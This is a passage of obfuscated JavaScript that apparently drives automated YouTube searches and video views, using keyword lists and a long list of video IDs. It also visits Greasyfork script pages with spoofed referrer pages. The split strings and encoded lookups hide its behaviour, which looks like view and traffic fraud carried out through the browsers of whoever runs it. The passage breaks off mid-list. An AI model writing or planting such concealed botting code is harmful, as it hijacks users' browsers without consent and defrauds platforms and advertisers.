searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + Z(0x5, 'r44M') + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x196c + 0x6 * -0x396 + 0xa5 * -0x6)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x11b8 + 0xc7a * 0x1 + -0x1e28)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x4 * -0x52c + 0x157f + -0x11 * 0xc);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    a0(0xe) + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    a0(0x11) + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    a0(0x10) + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': a0(0x13) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a0(0x15) + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + Z(0x7, 'K7zs') + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + a0(0x4) + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
